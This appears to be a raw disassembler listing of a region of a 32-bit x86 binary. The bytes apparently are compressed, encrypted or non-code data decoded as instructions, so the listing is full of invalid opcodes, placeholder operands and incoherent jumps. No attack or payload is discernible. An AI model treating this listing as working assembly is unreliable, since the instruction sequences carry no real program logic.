  41a8de:	scas   al,BYTE PTR es:[edi]
  41a8df:	jnp    0x41a867
  41a8e1:	(bad)  
  41a8e2:	xor    esp,edx
  41a8e4:	pop    esp
  41a8e5:	imul   edi,DWORD PTR [ebp-0x61],0xd209446
  41a8ec:	xchg   esp,eax
  41a8ed:	call   DWORD PTR ds:0x841340eb
  41a8f3:	xchg   edi,eax
  41a8f4:	adc    DWORD PTR [esi],edx
  41a8f6:	mov    eax,DWORD PTR [esi-0x3848cb95]
  41a8fc:	push   ecx
  41a8fd:	xor    eax,0xd99bf854
  41a902:	test   BYTE PTR [ecx+ebp*8+0x1d5fca],ch
  41a909:	mov    ebp,0x22d9f02d
  41a90e:	push   0xffffffa6
  41a910:	jge    0x41a945
  41a912:	adc    BYTE PTR ds:0x9fe32be7,al
  41a918:	add    eax,0xad2bccac
  41a91d:	inc    ebp
  41a91e:	ficom  DWORD PTR [eax+0x25]
  41a921:	mov    WORD PTR [edi+edx*8],gs
  41a924:	mov    ds:0xceb86de3,eax
  41a929:	aas    
  41a92a:	ret    0xc786
  41a92d:	bound  ebp,QWORD PTR ss:[edx+eax*8+0x7f6d0f37]
  41a935:	lods   al,BYTE PTR ds:[esi]
  41a936:	(bad)
  41a939:	xor    eax,0x578ee32
  41a93e:	inc    ebp
  41a93f:	xchg   edi,eax
  41a940:	popa   
	...
  41a9b1:	add    BYTE PTR [eax],al
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx+0x2f9e3df1]
  41a9c1:	dec    edx
  41a9c2:	int3   
  41a9c3:	clc    
  41a9c4:	in     eax,dx
  41a9c5:	pop    ds
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [edx+0x2afb6b37],al
  41a9d1:	inc    edi
  41a9d2:	fisttp QWORD PTR [edx+0x1b]
  41a9d5:	loopne 0x41aa16
  41a9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d8:	fisttp DWORD PTR [edx+0x4daeb667]
  41a9de:	push   edi
  41a9df:	xor    al,0x49
  41a9e1:	inc    edx
  41a9e2:	in     eax,dx
  41a9e3:	std    
  41a9e4:	dec    ebx
  41a9e5:	sbb    eax,0x8fd1d7a
  41a9ea:	mov    al,0x86
  41a9ec:	shl    BYTE PTR [ebx-0x72],cl
  41a9ef:	ret    
  41a9f0:	pop    ebx
  41a9f1:	shl    BYTE PTR [ebx-0x3612160],1
  41a9f7:	cli    
  41a9f8:	mov    cs,esi
  41a9fa:	into   
  41a9fb:	and    al,0x26
  41a9fd:	shl    DWORD PTR [eax+0x223b42be],0xb7
  41aa04:	dec    ecx
  41aa05:	cmp    al,bh
  41aa07:	inc    esp
  41aa08:	retf   
  41aa09:	xchg   edi,eax
  41aa0a:	inc    DWORD PTR [esi-0x400e248e]
  41aa10:	mov    ah,0xa3
  41aa12:	xor    DWORD PTR [edi],ebp
  41aa14:	sti    
  41aa15:	pop    esi
  41aa16:	xchg   edi,eax
  41aa17:	mov    ch,0x7a
  41aa19:	int3   
  41aa1a:	sbb    BYTE PTR [ecx+0x1352dd8c],dh
  41aa20:	std    
  41aa21:	in     eax,0xfe
  41aa23:	int    0x41
  41aa25:	retf   
  41aa26:	cmc    
  41aa27:	push   cs
  41aa28:	dec    esp
  41aa29:	xchg   esi,eax
  41aa2a:	jg     0x41a9e0
  41aa2c:	in     al,0xe7
  41aa2e:	leave  
  41aa2f:	test   eax,0xb986a82b
  41aa34:	(bad)  
  41aa35:	xchg   ecx,eax
  41aa36:	adc    eax,0xb71ac271
  41aa3b:	stc    
  41aa3c:	les    ebx,FWORD PTR [esi-0x4190a9c6]
  41aa42:	fcomi  st,st(6)
  41aa44:	and    eax,0x1527a119
  41aa49:	scas   al,BYTE PTR es:[edi]
  41aa4a:	outs   dx,DWORD PTR ds:[esi]
  41aa4b:	les    esi,FWORD PTR [edi+0x7b88dae1]
  41aa51:	and    dh,ch
  41aa53:	in     eax,0xab
  41aa55:	outs   dx,BYTE PTR ds:[esi]
  41aa56:	dec    ebp
  41aa57:	adc    ecx,edx
  41aa59:	xchg   edi,eax
  41aa5a:	cmp    BYTE PTR [ebx],ah
  41aa5c:	push   0xffffff8d
  41aa5e:	fist   DWORD PTR [ecx+0x62]
  41aa61:	mov    ebx,0xc6858741
  41aa66:	lds    ecx,FWORD PTR [edx+0x58]
  41aa69:	pop    ecx
  41aa6a:	jge    0x41aa7b
  41aa6c:	ss ins DWORD PTR es:[edi],dx
  41aa6e:	inc    edx
  41aa6f:	push   ebp
  41aa70:	dec    esp
  41aa71:	and    BYTE PTR [ecx-0x20],bh
  41aa74:	pop    edi
  41aa75:	xchg   esp,eax
  41aa76:	lods   eax,DWORD PTR ds:[esi]
  41aa77:	(bad)  
  41aa78:	xor    BYTE PTR [ebp+0x41145fb],bl
  41aa7e:	push   ss
  41aa7f:	and    eax,0x651ef345
  41aa84:	aas    
  41aa85:	jle    0x41aaa9
  41aa87:	add    esp,esi
  41aa89:	imul   edi,DWORD PTR [ebp-0x42a27c6],0x4b2d4daa
  41aa93:	or     ah,BYTE PTR [esi+0x5983e21a]
  41aa99:	jbe    0x41ab0d
  41aa9b:	lahf   
  41aa9c:	pop    eax
  41aa9d:	shr    DWORD PTR [edi+0x72],0xe1
  41aaa1:	imul   ecx,DWORD PTR [edx+0x4eb3fe34],0xca10af3a
  41aaab:	mov    ebx,0x6db301ec
  41aab0:	push   ebp
  41aab1:	xor    BYTE PTR [esi-0x63],ah
  41aab4:	es cmp ebp,ebx
  41aab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab8:	xor    DWORD PTR [eax-0x69bfc905],ebx
  41aabe:	fnsave [eax+0xc5]
	...
  41ab34:	dec    edx
  41ab35:	(bad)  
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x23]
  41ab41:	jmp    0x1:0x20e213d7
  41ab48:	cmc    
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR [ecx-0x7e],al
  41ab4e:	jmp    0x618d877c
  41ab53:	out    dx,al
  41ab54:	jp     0x41abd0
  41ab56:	call   DWORD PTR [ebx+0x35]
  41ab59:	mov    ch,0x53
  41ab5b:	sub    al,0xd9
  41ab5d:	out    dx,al
  41ab5e:	mov    ecx,DWORD PTR [ebx-0x5818891d]
  41ab64:	addr16 mov esi,0xf3cf35ad
  41ab6a:	out    dx,al
  41ab6b:	loop   0x41ab03
  41ab6d:	es push esi
  41ab6f:	aas    
  41ab70:	out    0x92,al
  41ab72:	repnz fisubr WORD PTR ss:[esi]
  41ab76:	stc    
  41ab77:	push   es
  41ab78:	adc    DWORD PTR [esi-0x43],edx
  41ab7b:	rol    DWORD PTR [ebp+0x7f],0xad
  41ab7f:	mov    eax,0x7ae2f9d9
  41ab84:	aam    0xd0
  41ab86:	and    eax,0x36ca677b
  41ab8b:	push   ecx
  41ab8c:	jbe    0x41ab77
  41ab8e:	mov    ch,0x6
  41ab90:	sub    DWORD PTR [eax+0x23],esp
  41ab93:	mov    eax,ds:0xef2f517a
  41ab98:	scas   eax,DWORD PTR es:[edi]
  41ab99:	mov    ah,0x98
  41ab9b:	nop
  41ab9c:	fcom   st(7)
  41ab9e:	xchg   esi,eax
  41ab9f:	xlat   BYTE PTR ds:[ebx]
  41aba0:	sub    dh,bh
  41aba2:	(bad)  
  41aba3:	outs   dx,BYTE PTR ds:[esi]
  41aba4:	sbb    ecx,DWORD PTR [eax+edi*2+0x66]
  41aba8:	outs   dx,BYTE PTR ds:[si]
  41abaa:	xor    eax,0xe83d6d45
  41abaf:	sti    
  41abb0:	sbb    al,0x3e
  41abb2:	push   ecx
  41abb3:	cvttps2pi mm6,QWORD PTR [ebx-0x44]
  41abb7:	loop   0x41ab7e
  41abb9:	adc    edx,edx
  41abbb:	pop    ebx
  41abbc:	hlt    
  41abbd:	ins    DWORD PTR es:[edi],dx
  41abbe:	sub    DWORD PTR [esi-0x18],ecx
  41abc1:	push   DWORD PTR [esi-0x15f95f74]
  41abc7:	(bad)  
  41abc8:	add    BYTE PTR [esi-0x4e],ch
  41abcb:	pop    edi
  41abcc:	push   eax
  41abcd:	cs jae 0x41ab5b
  41abd0:	cmp    BYTE PTR [ebx],0x99
  41abd3:	push   edx
  41abd4:	dec    eax
  41abd5:	clc    
  41abd6:	aas    
  41abd7:	es gs inc edx
  41abda:	inc    ecx
  41abdb:	adc    eax,0x621dd4c6
  41abe0:	sbb    eax,0x546f0c1b
  41abe5:	addr16 jns 0x41ac02
  41abe8:	loopne 0x41ab7c
  41abea:	add    eax,0x563ba9e6
  41abef:	dec    edx
  41abf0:	ja     0x41ab72
  41abf2:	rcr    BYTE PTR [edx+0x6654f591],cl
  41abf8:	out    dx,eax
  41abf9:	cmp    DWORD PTR [esi],eax
  41abfb:	inc    edx
  41abfc:	test   eax,eax
  41abfe:	out    0x11,eax
  41ac00:	jns    0x41ac14
  41ac02:	sahf   
  41ac03:	sbb    al,0x2
  41ac05:	adc    BYTE PTR [ecx+0x423701df],0xc3
  41ac0c:	xor    BYTE PTR [esi],al
  41ac0e:	cmp    dh,al
  41ac10:	xor    ebx,ebp
  41ac12:	cmp    ebx,DWORD PTR [ebp-0x3662718d]
  41ac18:	lahf   
  41ac19:	fldenv ds:0xe9c9b6a3
  41ac1f:	adc    DWORD PTR [ebp-0x50],esp
  41ac22:	les    edx,FWORD PTR [ebp+0x1d8179bc]
  41ac28:	das    
  41ac29:	sti    
  41ac2a:	mov    edx,0x1ad6db17
  41ac2f:	push   edx
  41ac30:	mov    ecx,0x1cfcdaf8
  41ac35:	mov    ?,WORD PTR [edx+0x40]
  41ac38:	dec    edx
  41ac39:	jg     0x41abc8
  41ac3b:	mov    ah,0xc3
  41ac3d:	ficom  DWORD PTR [ecx]
  41ac3f:	(bad)  [esi+0x0]
	...
  41acb1:	add    BYTE PTR [eax],al
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x25f102
  41acc3:	xchg   edi,edx
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    BYTE PTR [edi+0x5e],al
  41acce:	dec    edx
  41accf:	sub    edx,0x780b6ba9
  41acd5:	dec    ebx
  41acd6:	fxch   st(1)
  41acd8:	pop    edx
  41acd9:	retf   0x690d
  41acdc:	into   
  41acdd:	ret    0x9a3
  41ace0:	(bad)  [edi+0xd776621]
  41ace6:	xor    dl,BYTE PTR [edx]
  41ace8:	cmp    cl,BYTE PTR [ebx+0x6cf2f9a9]
  41acee:	jbe    0x41aca1
  41acf0:	cmp    dh,BYTE PTR [ebx-0x67ff5556]
  41acf6:	sub    bl,dl
  41acf8:	push   0xfb8080c1
  41acfd:	mov    esi,0x76f8d970
  41ad02:	xchg   edx,eax
  41ad03:	rcr    BYTE PTR [esi],0xc0
  41ad06:	inc    esp
  41ad07:	fstp   QWORD PTR ds:0x9cea279b
  41ad0d:	mov    bl,0x4
  41ad0f:	lds    eax,FWORD PTR [edi+0x7c]
  41ad12:	je     0x41ad53
  41ad14:	jecxz  0x41acab
  41ad16:	fucom  st(2)
  41ad18:	ficomp WORD PTR [edx-0x45]
  41ad1b:	mov    esp,0xed5c341f
  41ad20:	sahf   
  41ad21:	pslld  mm7,QWORD PTR [ebx-0x77]
  41ad25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad26:	mov    edi,0x71ed767f
  41ad2b:	jbe    0x41acb7
  41ad2d:	mov    al,0x54
  41ad2f:	cmp    eax,0xb1155c57
  41ad34:	aaa    
  41ad35:	pop    edx
  41ad36:	clc    
  41ad37:	movd   ebp,mm6
  41ad3a:	push   esp
  41ad3b:	xor    DWORD PTR [edx+ecx*4],edi
  41ad3e:	pop    eax
  41ad3f:	push   ebx
  41ad40:	sub    DWORD PTR [esi+ebp*4+0x48],ebx
  41ad44:	ror    DWORD PTR ds:0x75957278,0x47
  41ad4b:	mov    edx,0x3b670426
  41ad50:	xor    bh,BYTE PTR [edi]
  41ad52:	jns    0x41ace0
  41ad54:	jmp    0x41ad0c
  41ad56:	pop    ebp
  41ad57:	mov    cs,ebx
  41ad59:	inc    eax
  41ad5a:	pop    eax
  41ad5b:	pop    edi
  41ad5c:	je     0x41ad82
  41ad5e:	(bad)  
  41ad5f:	hlt    
  41ad60:	push   ss
  41ad61:	ja     0x41ad67
  41ad63:	stos   BYTE PTR es:[edi],al
  41ad64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad65:	pusha  
  41ad66:	fsubp  st(4),st
  41ad68:	or     BYTE PTR [ebp-0x25],dl
  41ad6b:	sbb    ch,al
  41ad6d:	sbb    ch,BYTE PTR [ecx]
  41ad6f:	shl    DWORD PTR [esi-0x6d],1
  41ad72:	fistp  QWORD PTR [ebx]
  41ad74:	xor    BYTE PTR [edi+0x2b],bh
  41ad77:	or     eax,DWORD PTR [esi+0x4]
  41ad7a:	inc    eax
  41ad7b:	push   ds
  41ad7c:	sbb    eax,0x6045df95
  41ad81:	mov    edi,0xda973c21
  41ad86:	jbe    0x41ad5c
  41ad88:	pop    edx
  41ad89:	mov    cl,0x8b
  41ad8b:	or     al,0x55
  41ad8d:	fcomp  QWORD PTR [edx]
  41ad8f:	cmp    eax,0x3d021127
  41ad94:	mov    DWORD PTR [esi+0x3fbe9a5],0x422920da
  41ad9e:	adc    BYTE PTR [edx],bl
  41ada0:	jae    0x41adac
  41ada2:	cwde   
  41ada3:	cmp    BYTE PTR [eax+0x73],cl
  41ada6:	pop    ss
  41ada7:	jle    0x41ad96
  41ada9:	add    eax,edx
  41adab:	cld    
  41adac:	xchg   ecx,eax
  41adad:	cmp    DWORD PTR [edi-0x7ceb045e],esp
  41adb3:	mov    edx,0x35e81334
  41adb8:	addr16 inc ebp
  41adba:	mov    eax,ds:0x9ca16881
  41adbf:	nop
  41adc0:	push   edi
	...
  41ae31:	add    BYTE PTR [eax],al
  41ae33:	add    BYTE PTR [edi+0x5fc517d8],al
  41ae39:	iret   
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi-0x21888be3]
  41ae41:	jae    0x41ae39
  41ae43:	retf   0x22cc
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	cmc    
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [edi*4-0x121b3313],ah
  41ae52:	xor    al,0x97
  41ae54:	call   0x2abd9a3c
  41ae59:	push   ebp
  41ae5a:	test   DWORD PTR [ecx],ebx
  41ae5c:	and    al,0x5d
  41ae5e:	out    0x5f,eax
  41ae60:	ja     0x41ae45
  41ae62:	push   edx
  41ae63:	mov    bh,al
  41ae65:	je     0x41ae39
  41ae67:	sbb    DWORD PTR [ebx+0x6226e03f],ecx
  41ae6d:	xchg   ebx,eax
  41ae6e:	test   DWORD PTR [ecx+eiz*8-0x620d9ab0],esp
  41ae75:	loopne 0x41ae93
  41ae77:	jb     0x41ae34
  41ae79:	pop    es
  41ae7a:	or     al,0xed
  41ae7c:	adc    bl,BYTE PTR [ecx-0x60]
  41ae7f:	mov    ecx,0xe1cb3a3
  41ae84:	dec    esp
  41ae85:	cdq    
  41ae86:	scas   al,BYTE PTR es:[edi]
  41ae87:	mov    ah,0x73
  41ae89:	fs aaa 
  41ae8b:	or     BYTE PTR [ecx],al
  41ae8d:	inc    eax
  41ae8e:	mov    eax,ds:0x835fb4ba
  41ae93:	(bad)  
  41ae94:	scas   eax,DWORD PTR es:[edi]
  41ae95:	rcl    bh,0xa7
  41ae98:	(bad)  
  41ae99:	fidivr DWORD PTR [ebp+0x5eb1b96a]
  41ae9f:	fdiv   DWORD PTR [ebx-0x3]
  41aea2:	mov    ch,0xd3
  41aea4:	or     bl,dh
  41aea6:	iret   
  41aea7:	ror    edi,cl
  41aea9:	pop    ebp
  41aeaa:	adc    bl,BYTE PTR [ebx+0x59cad20d]
  41aeb0:	or     al,0x9e
  41aeb2:	jge    0x41ae71
  41aeb4:	sub    esp,eax
  41aeb6:	call   0xb16f:0xde8facea
  41aebd:	sub    ebx,DWORD PTR ds:0xb58c9e93
  41aec3:	inc    ebp
  41aec4:	jne    0x41aea3
  41aec6:	mov    dl,dl
  41aec8:	jne    0x41ae73
  41aeca:	icebp  
  41aecb:	push   esp
  41aecc:	outs   dx,DWORD PTR ds:[esi]
  41aecd:	call   0x325f67de
  41aed2:	or     al,0x6e
  41aed4:	aas    
  41aed5:	mov    DWORD PTR [esi+0x59fcbbfd],ecx
  41aedb:	outs   dx,DWORD PTR ds:[esi]
  41aedc:	lods   al,BYTE PTR ds:[esi]
  41aedd:	cmp    BYTE PTR ds:0x17fabb16,bl
  41aee3:	jl     0x41af1d
  41aee5:	add    ah,cl
  41aee7:	mov    ss,WORD PTR [esi+0x2e62df54]
  41aeed:	dec    eax
  41aeee:	and    dl,bh
  41aef0:	xchg   ebp,eax
  41aef1:	mov    ah,0xa3
  41aef3:	xchg   DWORD PTR [eax+0x5c],ebx
  41aef6:	or     bh,dl
  41aef8:	(bad)  
  41aef9:	in     eax,dx
  41aefa:	dec    edx
  41aefb:	or     al,0xb
  41aefd:	fcom   DWORD PTR ss:[ecx-0x30981162]
  41af04:	fsubrp st(6),st
  41af06:	jp     0x41af28
  41af08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af09:	jle    0x41aefc
  41af0b:	mov    esi,0x95a9eb57
  41af10:	rol    esp,1
  41af12:	(bad)  
  41af13:	js     0x41af69
  41af15:	jl     0x41af4d
  41af17:	or     dh,ah
  41af19:	add    esi,DWORD PTR [esi]
  41af1b:	retf   
  41af1c:	jp     0x41af76
  41af1e:	dec    esp
  41af1f:	pushf  
  41af20:	clc    
  41af21:	dec    esp
  41af22:	aas    
  41af23:	sbb    ebx,DWORD PTR [eax+0x215a7b7b]
  41af29:	and    ebp,DWORD PTR [ebx+0x2d]
  41af2c:	xchg   edx,eax
  41af2d:	mov    ebp,0xeda1b96a
  41af32:	mov    ds:0xe5342502,al
  41af37:	mov    ebx,0x430c88a1
  41af3c:	mov    cl,0x69
  41af3e:	retf   
  41af3f:	dec    ebp
  41af40:	(bad)  
	...
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0xbb
  41afc1:	in     al,0x13
  41afc3:	xchg   edi,eax
  41afc4:	shl    DWORD PTR [ebx],0x1
  41afc7:	add    ch,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [eax+0x1c],bh
  41afce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afcf:	jnp    0x41afc1
  41afd1:	push   edi
  41afd2:	mov    ah,0xa6
  41afd4:	xor    al,0xfc
  41afd6:	mov    ecx,0x237a0498
  41afdb:	push   0x9167ac8b
  41afe0:	retf   
  41afe1:	pop    esi
  41afe2:	sub    al,0x80
  41afe4:	inc    ecx
  41afe5:	int3   
  41afe6:	inc    ecx
  41afe7:	outs   dx,DWORD PTR ds:[esi]
  41afe8:	inc    edi
  41afe9:	mov    esi,0x7d60f2bc
  41afee:	fs icebp 
  41aff0:	test   eax,0x713457a5
  41aff5:	fndisi(8087 only) 
  41aff7:	mov    ds:0x4ac195c3,al
  41affc:	icebp  
  41affd:	inc    esi
  41affe:	lock mov ds:0x8adfa0f4,al
  41b004:	loope  0x41aff9
  41b006:	test   eax,0x3a34b377
  41b00b:	cmp    bl,BYTE PTR [eax+0xd]
  41b00e:	push   ds
  41b00f:	inc    eax
  41b010:	shl    bh,cl
  41b012:	fistp  DWORD PTR [ebp+0x2b]
  41b015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b016:	(bad)  
  41b017:	push   esp
  41b018:	iret   
  41b019:	mov    bh,0x9f
  41b01b:	jp     0x41b09a
  41b01d:	xor    ah,BYTE PTR [ebx+0x7e93059]
  41b023:	push   ss
  41b024:	adc    BYTE PTR [ebx+0x77],al
  41b027:	push   ecx
  41b028:	test   al,0x2f
  41b02a:	pop    esi
  41b02b:	xor    ebp,edx
  41b02d:	mov    ecx,0x598fd790
  41b032:	std    
  41b033:	rol    BYTE PTR [esi+0xb1223aa],1
  41b039:	mov    edx,0x8edbe065
  41b03e:	mov    dh,0x70
  41b040:	dec    edx
  41b041:	je     0x41afd8
  41b043:	jne    0x41b0bd
  41b045:	pop    esp
  41b046:	xchg   edx,eax
  41b047:	mov    WORD PTR [ebp+0x5e],?
  41b04a:	xchg   al,al
  41b04c:	mov    cl,BYTE PTR [ecx+0x1fe72c83]
  41b052:	sub    BYTE PTR [edi-0x1b84efd3],0x41
  41b059:	(bad)  
  41b05a:	mov    ds:0x1831cd8b,eax
  41b05f:	jl     0x41b0cf
  41b061:	cmp    al,0xb9
  41b063:	(bad)  
  41b064:	jmp    0xcd7:0x32c57bed
  41b06b:	pop    ebp
  41b06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b06e:	push   ebx
  41b06f:	mov    ds:0x43618d82,eax
  41b074:	es dec esp
  41b076:	sbb    ebx,0x3ada68a0
  41b07c:	add    al,dl
  41b07e:	push   esi
  41b07f:	bound  edx,QWORD PTR [ecx+0x31]
  41b082:	xchg   esi,eax
  41b083:	jmp    0x41b016
  41b085:	repz hlt 
  41b087:	data16 cmp ch,0x89
  41b08b:	lea    ebp,[edi-0x18]
  41b08e:	jno    0x41b10d
  41b090:	adc    ebp,ebx
  41b092:	push   cs
  41b093:	pop    es
  41b094:	outs   dx,BYTE PTR ds:[esi]
  41b095:	mov    bh,0x61
  41b097:	hlt    
  41b098:	and    DWORD PTR [edx],edi
  41b09a:	cmp    BYTE PTR ss:[ebp-0x4a67a653],0x99
  41b0a2:	fiadd  WORD PTR [edx]
  41b0a4:	jns    0x41b065
  41b0a6:	in     eax,dx
  41b0a7:	aaa    
  41b0a8:	pop    esi
  41b0a9:	sbb    cl,BYTE PTR [ebx+0x4d50586c]
  41b0af:	xchg   ebp,eax
  41b0b0:	pop    esi
  41b0b1:	mov    eax,ds:0x94b491ab
  41b0b6:	dec    edx
  41b0b7:	shl    BYTE PTR [esi+0xa291389],0x30
  41b0be:	out    dx,eax
  41b0bf:	inc    ecx
  41b0c0:	jp     0x41b0c2
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	js     0x41b0ff
  41b142:	mov    esp,0x124b601
  41b147:	add    ch,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [ebx],dl
  41b14d:	call   0xa36e:0x1f589a9b
  41b154:	pop    eax
  41b155:	mov    ebx,0x33337dc3
  41b15a:	call   0xa460a8c5
  41b15f:	mov    cl,BYTE PTR [edi+0x28]
  41b162:	mov    eax,0x200d30c1
  41b167:	test   BYTE PTR [esi-0x68359ef8],0xed
  41b16e:	hlt    
  41b16f:	mov    esi,0xe15df5dd
  41b174:	sbb    DWORD PTR [ecx],ecx
  41b176:	shr    DWORD PTR [esi-0x29c8ae9e],0xcf
  41b17d:	inc    eax
  41b17e:	ret    
  41b17f:	sbb    DWORD PTR [edi],0x1dbb00b6
  41b185:	xchg   BYTE PTR [eax+0x21],al
  41b188:	push   edx
  41b189:	xchg   DWORD PTR [eax],esi
  41b18b:	mov    ds:0xb89520bc,eax
  41b190:	xchg   ebx,eax
  41b191:	rol    ch,cl
  41b193:	adc    eax,0x8e77181c
  41b198:	mov    ebx,0xb6865a96
  41b19d:	scas   al,BYTE PTR es:[edi]
  41b19e:	in     al,dx
  41b19f:	adc    eax,0xf515a77a
  41b1a4:	das    
  41b1a5:	arpl   WORD PTR [edi+0x78703bea],ax
  41b1ab:	lea    edi,[eax]
  41b1ad:	inc    eax
  41b1ae:	mov    DWORD PTR [ebx-0x5ef8f26],esp
  41b1b4:	int    0xdd
  41b1b6:	in     al,0x7
  41b1b8:	mov    BYTE PTR [ebx+0x44],ah
  41b1bb:	cmp    al,0x3
  41b1bd:	stc    
  41b1be:	fsub   st(3),st
  41b1c0:	loop   0x41b1cb
  41b1c2:	rol    BYTE PTR [ebx+0x67f57738],0xfb
  41b1c9:	ins    DWORD PTR es:[edi],dx
  41b1ca:	add    al,0xf
  41b1cc:	push   ecx
  41b1cd:	cmp    edx,DWORD PTR [edx+0x44]
  41b1d0:	arpl   WORD PTR [edi+0x4f9588cc],di
  41b1d6:	sbb    ah,ch
  41b1d8:	fidivr WORD PTR [esi]
  41b1da:	push   esp
  41b1db:	dec    edx
  41b1dc:	jne    0x41b1e2
  41b1de:	mul    DWORD PTR [ebx-0x56]
  41b1e1:	mov    bh,0x7
  41b1e3:	xor    DWORD PTR [esi+0x5e],edx
  41b1e6:	dec    esi
  41b1e7:	and    BYTE PTR [edi+0x1],dh
  41b1ea:	mov    ecx,0xfeb5787
  41b1ef:	jl     0x41b1a5
  41b1f1:	xor    BYTE PTR [esi],ch
  41b1f3:	aad    0xf2
  41b1f5:	and    bh,0x83
  41b1f8:	sub    DWORD PTR ds:0x5bad64a3,ebp
  41b1fe:	mov    dl,0x5f
  41b200:	adc    eax,0x574b06
  41b205:	cmp    esi,DWORD PTR [ebx-0x2b]
  41b208:	test   eax,0x9ceaa972
  41b20d:	add    DWORD PTR [edx+0x40],0x37f3976e
  41b214:	aam    0xd3
  41b216:	xor    ch,dl
  41b218:	imul   eax,DWORD PTR [ecx-0x5a36aa54],0x8f0dcb94
  41b222:	test   eax,0x2ffff9e3
  41b227:	in     eax,0x8
  41b229:	mov    es,esp
  41b22b:	pop    esi
  41b22c:	xchg   esi,eax
  41b22d:	and    bl,BYTE PTR [esi]
  41b22f:	std    
  41b230:	cbw    
  41b232:	(bad)  [ecx-0x1]
  41b235:	dec    eax
  41b236:	test   DWORD PTR [edx+0x1e],ebp
  41b239:	cmc    
  41b23a:	sub    edx,DWORD PTR [edx+eax*1]
  41b23d:	mov    edx,0x108d4e
	...
  41b2b2:	add    BYTE PTR [eax],al
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	mov    ebx,0xab8eeaf9
  41b2c5:	and    eax,0xf50001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	push   cs
  41b2cd:	sub    al,0x6b
  41b2cf:	gs cs and eax,0xe9397590
  41b2d6:	popf   
  41b2d7:	dec    edi
  41b2d8:	mov    es,edx
  41b2da:	inc    esi
  41b2db:	sbb    al,0xe4
  41b2dd:	or     DWORD PTR [ebp-0x21c7cbb4],0xffffffcd
  41b2e4:	(bad)  
  41b2e5:	outs   dx,DWORD PTR ds:[esi]
  41b2e6:	retf   0x4d7b
  41b2e9:	cmp    eax,0x6ca999c
  41b2ee:	sbb    DWORD PTR [edx-0x64],ecx
  41b2f1:	in     eax,dx
  41b2f2:	out    0xbc,eax
  41b2f4:	addr16 pop edi
  41b2f6:	nop
  41b2f7:	dec    eax
  41b2f8:	lahf   
  41b2f9:	ss mov ebx,0xdc3384e5
  41b2ff:	repz popa 
  41b301:	mov    ds:0x88ec4ba6,eax
  41b306:	dec    edx
  41b307:	js     0x41b36d
  41b309:	dec    ebp
  41b30a:	mov    al,ds:0x9e2a287e
  41b30f:	out    dx,eax
  41b310:	add    BYTE PTR [esi+0x2e],0x4
  41b314:	iret   
  41b315:	js     0x41b37b
  41b317:	out    0x5f,eax
  41b319:	xor    al,0x5a
  41b31b:	xor    eax,0x18bb13c4
  41b320:	mov    bl,0x52
  41b322:	sub    edi,DWORD PTR [eax-0x15]
  41b325:	aas    
  41b326:	mov    edi,gs
  41b328:	out    dx,eax
  41b329:	mov    al,ds:0xf6d82c05
  41b32e:	dec    edx
  41b32f:	(bad)  
  41b330:	xchg   esi,eax
  41b331:	fwait
  41b332:	inc    esp
  41b333:	(bad)  
  41b334:	cmc    
  41b335:	add    ebx,DWORD PTR [eax]
  41b337:	inc    esi
  41b338:	loopne 0x41b30a
  41b33a:	out    dx,eax
  41b33b:	pusha  
  41b33c:	cmp    dl,BYTE PTR [ebx-0x78fb0f09]
  41b342:	shr    BYTE PTR [eax-0x4e795b76],cl
  41b348:	shl    BYTE PTR [ebp-0x26],0x80
  41b34c:	test   DWORD PTR [ebx],eax
  41b34e:	cld    
  41b34f:	out    0x5f,al
  41b351:	in     al,0x7
  41b353:	or     BYTE PTR [esi],dl
  41b355:	push   0x9e14d35e
  41b35a:	sbb    ch,dh
  41b35c:	js     0x41b2e5
  41b35e:	cmp    BYTE PTR [esi],0xc
  41b361:	stos   DWORD PTR es:[edi],eax
  41b362:	adc    ch,BYTE PTR [edi]
  41b364:	(bad)  
  41b365:	mov    WORD PTR [ecx+0xff8f8a7],ds
  41b36b:	imul   edi,DWORD PTR [ebp+edx*4+0xbea3301],0x9a21d6d0
